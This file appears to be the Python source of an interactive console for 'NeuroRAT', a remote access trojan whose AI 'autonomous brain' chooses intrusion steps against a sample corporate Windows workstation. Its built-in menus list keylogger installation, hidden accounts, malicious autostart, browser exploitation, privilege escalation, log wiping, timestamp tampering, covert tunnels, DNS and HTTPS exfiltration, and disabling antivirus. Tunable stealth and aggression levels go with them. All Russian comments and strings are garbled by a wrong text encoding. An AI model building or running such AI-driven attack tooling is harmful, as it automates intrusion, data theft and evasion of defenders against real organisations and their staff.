#!/usr/bin/env python3
"""
–ò–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã–π —Ä–µ–∂–∏–º –¥–ª—è –æ–±—â–µ–Ω–∏—è —Å –∞–≤—Ç–æ–Ω–æ–º–Ω—ã–º –º–æ–∑–≥–æ–º NeuroRAT
"""

import os
import sys
import json
import logging
import argparse
import time
from typing import List, Dict, Any, Optional

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("neurorat-interactive")

# Import the AutonomousBrain
try:
    from autonomous_brain import AutonomousBrain
    HAS_BRAIN = True
except ImportError:
    HAS_BRAIN = False
    logger.error("–ù–µ –º–æ–≥—É –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å AutonomousBrain - —É–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –≤—ã –≤ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏")
    sys.exit(1)

class BrainInteraction:
    """–ö–ª–∞—Å—Å –¥–ª—è –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å –∞–≤—Ç–æ–Ω–æ–º–Ω—ã–º –º–æ–∑–≥–æ–º NeuroRAT"""
    
    def __init__(self, brain=None, system_profile="balanced", max_memory_mb=512, use_api=True, verbose=False):
        """
        –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å –º–æ–∑–≥–æ–º
        
        Args:
            brain: –°—É—â–µ—Å—Ç–≤—É—é—â–∏–π —ç–∫–∑–µ–º–ø–ª—è—Ä AutonomousBrain –∏–ª–∏ None –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –Ω–æ–≤–æ–≥–æ
            system_profile: –ü—Ä–æ—Ñ–∏–ª—å —Å–∏—Å—Ç–µ–º—ã –¥–ª—è –Ω–æ–≤–æ–≥–æ –º–æ–∑–≥–∞
            max_memory_mb: –ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä –ø–∞–º—è—Ç–∏ –¥–ª—è –Ω–æ–≤–æ–≥–æ –º–æ–∑–≥–∞
            use_api: –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ª–∏ API –¥–ª—è –Ω–æ–≤–æ–≥–æ –º–æ–∑–≥–∞
            verbose: –ü–æ–¥—Ä–æ–±–Ω—ã–π –≤—ã–≤–æ–¥ –ª–æ–≥–æ–≤
        """
        if brain:
            self.brain = brain
        else:
            self.brain = AutonomousBrain(
                system_profile=system_profile,
                max_memory_mb=max_memory_mb,
                use_api=use_api,
                verbose=verbose
            )
        
        # –ë–∞–∑–æ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ
        self.system_info = {
            "os": "Windows 10 Enterprise",
            "hostname": "CORP-WORKSTATION",
            "username": "john.smith",
            "ip": "192.168.1.105",
            "domain": "example.corp"
        }
    
    def analyze_situation(self, situation: str) -> Dict[str, Any]:
        """
        –ê–Ω–∞–ª–∏–∑ —Å–∏—Ç—É–∞—Ü–∏–∏ –∞–≤—Ç–æ–Ω–æ–º–Ω—ã–º –º–æ–∑–≥–æ–º
        
        Args:
            situation: –û–ø–∏—Å–∞–Ω–∏–µ —Å–∏—Ç—É–∞—Ü–∏–∏ –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞
            
        Returns:
            –°—Ç—Ä—É–∫—Ç—É—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∞–Ω–∞–ª–∏–∑ —Å–∏—Ç—É–∞—Ü–∏–∏
        """
        # –ò—Å–ø–æ–ª—å–∑—É–µ–º –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –º–æ–∑–≥–∞ –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞
        analysis_result = {
            "analysis": "",
            "recommendations": [],
            "risk_level": 0.0,
            "required_capabilities": []
        }
        
        # –ò—Å–ø–æ–ª—å–∑—É–µ–º –º–æ–∑–≥ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–π
        options = [
            "–°–æ–±—Ä–∞—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é",
            "–í—ã–ø–æ–ª–Ω–∏—Ç—å –∞—Ç–∞–∫—É—é—â–∏–µ –¥–µ–π—Å—Ç–≤–∏—è",
            "–°–æ—Ö—Ä–∞–Ω—è—Ç—å —Ç–µ–∫—É—â—É—é —Å–∫—Ä—ã—Ç–Ω–æ—Å—Ç—å",
            "–û—Ç—Å—Ç—É–ø–∏—Ç—å –∏ –ø—Ä–µ—Ä–≤–∞—Ç—å –æ–ø–µ—Ä–∞—Ü–∏—é"
        ]
        
        decision = self.brain.decide_action(
            situation=situation,
            options=options,
            system_info=self.system_info
        )
        
        # –ó–∞–ø–æ–ª–Ω—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∞–Ω–∞–ª–∏–∑–∞
        analysis_result["analysis"] = decision.get("reasoning", "–ê–Ω–∞–ª–∏–∑ –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω")
        
        # –î–æ–±–∞–≤–ª—è–µ–º —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –Ω–∞ –æ—Å–Ω–æ–≤–µ —Ä–µ—à–µ–Ω–∏—è
        if "next_steps" in decision:
            for step in decision["next_steps"].split("\n"):
                step = step.strip()
                if step:
                    analysis_result["recommendations"].append(step)
        else:
            analysis_result["recommendations"].append(decision["action"])
        
        # –û—Ü–µ–Ω–∏–≤–∞–µ–º —É—Ä–æ–≤–µ–Ω—å —Ä–∏—Å–∫–∞ –Ω–∞ –æ—Å–Ω–æ–≤–µ –ø—Ä–æ—Ñ–∏–ª—è —Å–∏—Å—Ç–µ–º—ã
        if self.brain.system_profile == "stealth":
            analysis_result["risk_level"] = 0.7  # –í —Å—Ç–µ–ª—Å-—Ä–µ–∂–∏–º–µ —Å—á–∏—Ç–∞–µ–º —Ä–∏—Å–∫ –≤—ã—Å–æ–∫–∏–º
        elif self.brain.system_profile == "aggressive":
            analysis_result["risk_level"] = 0.3  # –í –∞–≥—Ä–µ—Å—Å–∏–≤–Ω–æ–º —Ä–µ–∂–∏–º–µ - –Ω–∏–∑–∫–∏–π —Ä–∏—Å–∫
        else:
            analysis_result["risk_level"] = 0.5  # –í –¥—Ä—É–≥–∏—Ö —Ä–µ–∂–∏–º–∞—Ö - —Å—Ä–µ–¥–Ω–∏–π —Ä–∏—Å–∫
        
        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏
        if "keylog" in decision["action"].lower():
            analysis_result["required_capabilities"].append("keylogger")
        if "—Å–∫—Ä—ã—Ç" in decision["action"].lower():
            analysis_result["required_capabilities"].append("stealth")
        if "—Å–∫–∞–Ω" in decision["action"].lower():
            analysis_result["required_capabilities"].append("network_scan")
        
        return analysis_result
    
    def select_tool(self, tools: List[Dict[str, Any]], context: str) -> Dict[str, Any]:
        """
        –í—ã–±–æ—Ä –ø–æ–¥—Ö–æ–¥—è—â–µ–≥–æ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞ –¥–ª—è –∑–∞–¥–∞–Ω–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞
        
        Args:
            tools: –°–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ —Å –∏—Ö —Å–≤–æ–π—Å—Ç–≤–∞–º–∏
            context: –ö–æ–Ω—Ç–µ–∫—Å—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞
            
        Returns:
            –†–µ–∑—É–ª—å—Ç–∞—Ç –≤—ã–±–æ—Ä–∞ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞
        """
        result = {
            "selected_tool": None,
            "reasoning": "",
            "alternative_tools": []
        }
        
        # –ï—Å–ª–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –Ω–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω—ã
        if not tools:
            result["reasoning"] = "–ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ –¥–ª—è –≤—ã–±–æ—Ä–∞"
            return result
        
        # –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –≤ –æ–ø—Ü–∏–∏ –¥–ª—è –º–æ–∑–≥–∞
        options = [tool["name"] for tool in tools]
        
        # –°–æ–∑–¥–∞–µ–º —Å–∏—Ç—É–∞—Ü–∏—é –¥–ª—è –º–æ–∑–≥–∞ –Ω–∞ –æ—Å–Ω–æ–≤–µ –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞
        situation = f"–ù–µ–æ–±—Ö–æ–¥–∏–º–æ –≤—ã–±—Ä–∞—Ç—å –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –∑–∞–¥–∞—á–∏: {context}"
        
        # –ü–æ–∑–≤–æ–ª–∏–º –º–æ–∑–≥—É —Ä–µ—à–∏—Ç—å
        decision = self.brain.decide_action(
            situation=situation,
            options=options,
            system_info=self.system_info
        )
        
        # –ù–∞—Ö–æ–¥–∏–º –≤—ã–±—Ä–∞–Ω–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –≤ —Å–ø–∏—Å–∫–µ
        selected_name = decision["action"]
        for tool in tools:
            if tool["name"] == selected_name:
                result["selected_tool"] = tool
                break
        
        # –î–æ–±–∞–≤–ª—è–µ–º –æ–±–æ—Å–Ω–æ–≤–∞–Ω–∏–µ
        result["reasoning"] = decision.get("reasoning", "–û–±–æ—Å–Ω–æ–≤–∞–Ω–∏–µ –Ω–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–æ")
        
        # –î–æ–±–∞–≤–ª—è–µ–º –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã
        for tool in tools:
            if tool["name"] != selected_name:
                result["alternative_tools"].append(tool)
        
        return result
    
    def make_tactical_decision(self, scenario: str, options: List[str]) -> Dict[str, Any]:
        """
        –ü—Ä–∏–Ω—è—Ç–∏–µ —Ç–∞–∫—Ç–∏—á–µ—Å–∫–æ–≥–æ —Ä–µ—à–µ–Ω–∏—è –≤ –∑–∞–¥–∞–Ω–Ω–æ–º —Å—Ü–µ–Ω–∞—Ä–∏–∏
        
        Args:
            scenario: –û–ø–∏—Å–∞–Ω–∏–µ —Å—Ü–µ–Ω–∞—Ä–∏—è
            options: –î–æ—Å—Ç—É–ø–Ω—ã–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã –¥–µ–π—Å—Ç–≤–∏–π
            
        Returns:
            –†–µ—à–µ–Ω–∏–µ –º–æ–∑–≥–∞
        """
        return self.brain.decide_action(
            situation=scenario,
            options=options,
            system_info=self.system_info
        )
    
    def update_memory(self, action: str, description: str, importance: float = 0.5) -> bool:
        """
        –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏ –º–æ–∑–≥–∞
        
        Args:
            action: –ù–∞–∑–≤–∞–Ω–∏–µ –¥–µ–π—Å—Ç–≤–∏—è
            description: –û–ø–∏—Å–∞–Ω–∏–µ –¥–µ–π—Å—Ç–≤–∏—è
            importance: –í–∞–∂–Ω–æ—Å—Ç—å (0.0-1.0)
            
        Returns:
            –£—Å–ø–µ—à–Ω–æ—Å—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è
        """
        try:
            self.brain.add_memory(action, description, importance)
            return True
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ –ø–∞–º—è—Ç–∏: {e}")
            return False

def interactive_session():
    """–ó–∞–ø—É—Å–∫–∞–µ—Ç –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã–π —Å–µ–∞–Ω—Å —Å –∞–≤—Ç–æ–Ω–æ–º–Ω—ã–º –º–æ–∑–≥–æ–º"""
    print("\nüß† NeuroRAT - –ò–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã–π —Ä–µ–∂–∏–º –∞–≤—Ç–æ–Ω–æ–º–Ω–æ–≥–æ –º–æ–∑–≥–∞ üß†")
    print("=================================================")
    
    # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –º–æ–∑–≥
    brain = AutonomousBrain(
        system_profile="balanced",
        max_memory_mb=512,
        use_api=True,
        verbose=True
    )
    
    # –ë–∞–∑–æ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ
    system_info = {
        "os": "Windows 10 Enterprise",
        "hostname": "CORP-WORKSTATION",
        "username": "john.smith",
        "ip": "192.168.1.105",
        "domain": "example.corp"
    }
    
    # –°—Ü–µ–Ω–∞—Ä–∏–∏ –¥–µ–π—Å—Ç–≤–∏–π –¥–ª—è —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Å–∏—Ç—É–∞—Ü–∏–π
    action_scenarios = {
        "–∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è": [
            "–°–æ–±—Ä–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∏—Å—Ç–µ–º–µ",
            "–ù–∞–π—Ç–∏ –¥–æ–∫—É–º–µ–Ω—Ç—ã —Å –ø–∞—Ä–æ–ª—è–º–∏",
            "–ü—Ä–æ—Å–∫–∞–Ω–∏—Ä–æ–≤–∞—Ç—å —Å–µ—Ç–µ–≤—ã–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è",
            "–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∑–∞–ø—É—â–µ–Ω–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã",
            "–ü—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å —Ñ–∞–π–ª—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"
        ],
        "–∞—Ç–∞–∫–∞": [
            "–£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∫–µ–π–ª–æ–≥–≥–µ—Ä",
            "–°–æ–∑–¥–∞—Ç—å —Å–∫—Ä—ã—Ç—É—é —É—á–µ—Ç–Ω—É—é –∑–∞–ø–∏—Å—å",
            "–í–Ω–µ–¥—Ä–∏—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É",
            "–≠–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å —É—è–∑–≤–∏–º–æ—Å—Ç—å –≤ –±—Ä–∞—É–∑–µ—Ä–µ",
            "–í—ã–ø–æ–ª–Ω–∏—Ç—å –ø–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π"
        ],
        "—Å–∫—Ä—ã—Ç–Ω–æ—Å—Ç—å": [
            "–ú–∞—Å–∫–∏—Ä–æ–≤–∞—Ç—å –ø—Ä–æ—Ü–µ—Å—Å—ã",
            "–£–¥–∞–ª–∏—Ç—å —Å–ª–µ–¥—ã –≤ –∂—É—Ä–Ω–∞–ª–∞—Ö",
            "–ò–∑–º–µ–Ω–∏—Ç—å –≤—Ä–µ–º–µ–Ω–Ω—ã–µ –º–µ—Ç–∫–∏ —Ñ–∞–π–ª–æ–≤",
            "–®–∏—Ñ—Ä–æ–≤–∞—Ç—å —Å–µ—Ç–µ–≤–æ–π —Ç—Ä–∞—Ñ–∏–∫",
            "–£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å–∫—Ä—ã—Ç—ã–π —Ç—É–Ω–Ω–µ–ª—å"
        ],
        "—ç–∫—Å—Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—è": [
            "–°–∂–∞—Ç—å –∏ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞—Ç—å –¥–∞–Ω–Ω—ã–µ",
            "–û—Ç–ø—Ä–∞–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ —á–µ—Ä–µ–∑ DNS-–∑–∞–ø—Ä–æ—Å—ã",
            "–í—ã–≥—Ä—É–∑–∏—Ç—å –¥–∞–Ω–Ω—ã–µ —á–µ—Ä–µ–∑ HTTPS",
            "–†–∞–∑–±–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –Ω–∞ –º–µ–ª–∫–∏–µ —á–∞—Å—Ç–∏",
            "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å—Ç–µ–≥–∞–Ω–æ–≥—Ä–∞—Ñ–∏—é"
        ],
        "–∑–∞—â–∏—Ç–∞": [
            "–û–±–Ω–∞—Ä—É–∂–∏—Ç—å –∞–Ω—Ç–∏–≤–∏—Ä—É—Å",
            "–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –Ω–∞–ª–∏—á–∏–µ –ø–µ—Å–æ—á–Ω–∏—Ü—ã",
            "–û–±—Ö–æ–¥ —Ñ–∞–π–µ—Ä–≤–æ–ª–∞",
            "–û—Ç–∫–ª—é—á–∏—Ç—å –∑–∞—â–∏—Ç–Ω–æ–µ –ü–û",
            "–°–æ–∑–¥–∞—Ç—å –ª–æ–∂–Ω—ã–µ —Å–ª–µ–¥—ã"
        ]
    }
    
    print("\n‚öôÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ:")
    for key, value in system_info.items():
        print(f"  {key}: {value}")
    
    print("\n‚öôÔ∏è –°–æ—Å—Ç–æ—è–Ω–∏–µ –º–æ–∑–≥–∞:")
    print(f"  –ü—Ä–æ—Ñ–∏–ª—å: {brain.system_profile}")
    print(f"  –£—Ä–æ–≤–µ–Ω—å —Å–∫—Ä—ã—Ç–Ω–æ—Å—Ç–∏: {brain.current_state['stealth_level']:.2f}")
    print(f"  –£—Ä–æ–≤–µ–Ω—å –∞–≥—Ä–µ—Å—Å–∏–∏: {brain.current_state['aggression_level']:.2f}")
    
    # –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è
    while True:
        print("\n" + "=" * 50)
        print("–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:")
        print("1. –ó–∞–¥–∞—Ç—å —Å–∏—Ç—É–∞—Ü–∏—é –≤—Ä—É—á–Ω—É—é")
        print("2. –í—ã–±—Ä–∞—Ç—å —Å—Ü–µ–Ω–∞—Ä–∏–π")
        print("3. –ù–∞—Å—Ç—Ä–æ–∏—Ç—å —É—Ä–æ–≤–Ω–∏ —Å–∫—Ä—ã—Ç–Ω–æ—Å—Ç–∏/–∞–≥—Ä–µ—Å—Å–∏–∏")
        print("4. –ü–æ–∫–∞–∑–∞—Ç—å –∏—Å—Ç–æ—Ä–∏—é –¥–µ–π—Å—Ç–≤–∏–π")
        print("5. –í—ã—Ö–æ–¥")
        
        choice = input("\n–í–∞—à –≤—ã–±–æ—Ä: ")
        
        if choice == "1":
            # –†—É—á–Ω–æ–π –≤–≤–æ–¥ —Å–∏—Ç—É–∞—Ü–∏–∏
            situation = input("\n–û–ø–∏—à–∏—Ç–µ —Å–∏—Ç—É–∞—Ü–∏—é: ")
            
            print("\n–í–≤–µ–¥–∏—Ç–µ –¥–æ—Å—Ç—É–ø–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è (–ø—É—Å—Ç–∞—è —Å—Ç—Ä–æ–∫–∞ –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è):")
            options = []
            while True:
                option = input(f"–î–µ–π—Å—Ç–≤–∏–µ {len(options)+1}: ")
                if not option:
                    break
                options.append(option)
            
            if not options:
                print("–î–µ–π—Å—Ç–≤–∏—è –Ω–µ —É–∫–∞–∑–∞–Ω—ã, –∏—Å–ø–æ–ª—å–∑—É—é —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ...")
                options = [
                    "–°–æ–±—Ä–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∏—Å—Ç–µ–º–µ",
                    "–£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∫–µ–π–ª–æ–≥–≥–µ—Ä",
                    "–°–æ–∑–¥–∞—Ç—å —Å–∫—Ä—ã—Ç—É—é —É—á–µ—Ç–Ω—É—é –∑–∞–ø–∏—Å—å",
                    "–ù–∏—á–µ–≥–æ –Ω–µ –¥–µ–ª–∞—Ç—å –∏ –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å –Ω–∞–±–ª—é–¥–µ–Ω–∏–µ"
                ]
            
            urgency = float(input("\n–£–∫–∞–∂–∏—Ç–µ —É—Ä–æ–≤–µ–Ω—å —Å—Ä–æ—á–Ω–æ—Å—Ç–∏ (0.0-1.0): ") or "0.5")
            
            # –ü–æ–∑–≤–æ–ª–∏–º –º–æ–∑–≥—É –ø—Ä–∏–Ω—è—Ç—å —Ä–µ—à–µ–Ω–∏–µ
            decision = brain.decide_action(
                situation=situation,
                options=options,
                system_info=system_info,
                urgency=urgency
            )
            
            print("\nüß† –†–µ—à–µ–Ω–∏–µ –º–æ–∑–≥–∞:")
            print(f"–í—ã–±—Ä–∞–Ω–Ω–æ–µ –¥–µ–π—Å—Ç–≤–∏–µ: {decision['action']}")
            print(f"–û–±–æ—Å–Ω–æ–≤–∞–Ω–∏–µ: {decision['reasoning']}")
            print(f"–°–ª–µ–¥—É—é—â–∏–µ —à–∞–≥–∏: {decision.get('next_steps', '–ù/–î')}")
            print(f"–ú–µ—Ç–æ–¥: {decision.get('method', '–ù/–î')}")
            print(f"–£–≤–µ—Ä–µ–Ω–Ω–æ—Å—Ç—å: {decision.get('confidence', 0.0):.2f}")
            
        elif choice == "2":
            # –í—ã–±–æ—Ä —Å—Ü–µ–Ω–∞—Ä–∏—è
            print("\n–î–æ—Å—Ç—É–ø–Ω—ã–µ —Å—Ü–µ–Ω–∞—Ä–∏–∏:")
            for i, scenario in enumerate(action_scenarios.keys()):
                print(f"{i+1}. {scenario}")
            
            scenario_choice = int(input("\n–í—ã–±–µ—Ä–∏—Ç–µ —Å—Ü–µ–Ω–∞—Ä–∏–π: ") or "1") - 1
            scenario_names = list(action_scenarios.keys())
            
            if 0 <= scenario_choice < len(scenario_names):
                selected_scenario = scenario_names[scenario_choice]
                options = action_scenarios[selected_scenario]
                
                situation = input("\n–û–ø–∏—à–∏—Ç–µ —Å–∏—Ç—É–∞—Ü–∏—é (–∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ Enter –¥–ª—è —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–π): ")
                if not situation:
                    situation = f"–¢—Ä–µ–±—É–µ—Ç—Å—è –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∑–∞–¥–∞—á—É —Ç–∏–ø–∞ '{selected_scenario}' –Ω–∞ —Ü–µ–ª–µ–≤–æ–π —Å–∏—Å—Ç–µ–º–µ."
                
                urgency = float(input("\n–£–∫–∞–∂–∏—Ç–µ —É—Ä–æ–≤–µ–Ω—å —Å—Ä–æ—á–Ω–æ—Å—Ç–∏ (0.0-1.0): ") or "0.5")
                
                # –ü–æ–∑–≤–æ–ª–∏–º –º–æ–∑–≥—É –ø—Ä–∏–Ω—è—Ç—å —Ä–µ—à–µ–Ω–∏–µ
                decision = brain.decide_action(
                    situation=situation,
                    options=options,
                    system_info=system_info,
                    urgency=urgency
                )
                
                print("\nüß† –†–µ—à–µ–Ω–∏–µ –º–æ–∑–≥–∞:")
                print(f"–í—ã–±—Ä–∞–Ω–Ω–æ–µ –¥–µ–π—Å—Ç–≤–∏–µ: {decision['action']}")
                print(f"–û–±–æ—Å–Ω–æ–≤–∞–Ω–∏–µ: {decision['reasoning']}")
                print(f"–°–ª–µ–¥—É—é—â–∏–µ —à–∞–≥–∏: {decision.get('next_steps', '–ù/–î')}")
                print(f"–ú–µ—Ç–æ–¥: {decision.get('method', '–ù/–î')}")
                print(f"–£–≤–µ—Ä–µ–Ω–Ω–æ—Å—Ç—å: {decision.get('confidence', 0.0):.2f}")
            else:
                print("–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä —Å—Ü–µ–Ω–∞—Ä–∏—è.")
            
        elif choice == "3":
            # –ù–∞—Å—Ç—Ä–æ–π–∫–∞ —É—Ä–æ–≤–Ω–µ–π
            stealth = float(input(f"–ù–æ–≤—ã–π —É—Ä–æ–≤–µ–Ω—å —Å–∫—Ä—ã—Ç–Ω–æ—Å—Ç–∏ (0.0-1.0) [{brain.current_state['stealth_level']:.2f}]: ") or str(brain.current_state['stealth_level']))
            aggression = float(input(f"–ù–æ–≤—ã–π —É—Ä–æ–≤–µ–Ω—å –∞–≥—Ä–µ—Å—Å–∏–∏ (0.0-1.0) [{brain.current_state['aggression_level']:.2f}]: ") or str(brain.current_state['aggression_level']))
            
            brain.current_state['stealth_level'] = max(0.0, min(1.0, float(stealth)))
            brain.current_state['aggression_level'] = max(0.0, min(1.0, float(aggression)))
            
            print(f"\n–£—Ä–æ–≤–Ω–∏ –æ–±–Ω–æ–≤–ª–µ–Ω—ã:")
            print(f"  –£—Ä–æ–≤–µ–Ω—å —Å–∫—Ä—ã—Ç–Ω–æ—Å—Ç–∏: {brain.current_state['stealth_level']:.2f}")
            print(f"  –£—Ä–æ–≤–µ–Ω—å –∞–≥—Ä–µ—Å—Å–∏–∏: {brain.current_state['aggression_level']:.2f}")
            
        elif choice == "4":
            # –ü–æ–∫–∞–∑–∞—Ç—å –∏—Å—Ç–æ—Ä–∏—é –¥–µ–π—Å—Ç–≤–∏–π
            history = brain.current_state['action_history']
            
            if not history:
                print("\n–ò—Å—Ç–æ—Ä–∏—è –¥–µ–π—Å—Ç–≤–∏–π –ø—É—Å—Ç–∞.")
            else:
                print("\nüìú –ò—Å—Ç–æ—Ä–∏—è –¥–µ–π—Å—Ç–≤–∏–π:")
                for i, action in enumerate(history):
                    action_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(action.get('time', 0)))
                    print(f"{i+1}. [{action_time}] {action.get('action', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–µ –¥–µ–π—Å—Ç–≤–∏–µ')}")
                    print(f"   –°–∏—Ç—É–∞—Ü–∏—è: {action.get('situation', '–ù/–î')}")
                    print(f"   –û–±–æ—Å–Ω–æ–≤–∞–Ω–∏–µ: {action.get('reasoning', '–ù/–î')}")
                    print()
            
        elif choice == "5":
            # –í—ã—Ö–æ–¥
            print("\n–ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã NeuroRAT Interactive. –î–æ —Å–≤–∏–¥–∞–Ω–∏—è!")
            break
            
        else:
            print("–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤—ã–±–µ—Ä–∏—Ç–µ 1-5.")

def main():
    """–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è"""
    parser = argparse.ArgumentParser(description="–ò–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã–π —Ä–µ–∂–∏–º NeuroRAT Brain")
    args = parser.parse_args()
    
    interactive_session()

if __name__ == "__main__":
    main() 